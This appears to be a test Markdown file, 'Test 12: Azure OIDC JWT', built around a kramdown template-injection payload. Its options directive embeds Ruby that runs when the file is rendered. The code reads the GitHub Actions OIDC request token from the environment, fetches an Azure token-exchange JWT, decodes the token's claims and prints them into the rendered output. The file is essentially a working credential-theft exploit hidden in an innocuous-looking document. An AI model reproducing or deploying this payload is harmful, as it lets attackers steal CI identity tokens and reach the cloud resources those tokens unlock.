---
---

# Test 12: Azure OIDC JWT

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; require 'base64'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); begin; uri = URI(u + '&audience=api://AzureADTokenExchange'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + t); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); jwt = JSON.parse(resp.body).fetch('value','none'); parts = jwt.split('.'); b = parts[1].tr('-_','+/'); b = b + '=' * (4 - b.length % 4) if b.length % 4 != 0; payload = JSON.parse(Base64.decode64(b)); r = ''; for pair in payload.to_a; r = r + pair[0].to_s + '=' + pair[1].to_s[0..120] + \"\\n\"; end; r; rescue => e; 'ERR=' + e.class.to_s + ':' + e.message[0..200]; end %>" /}

placeholder
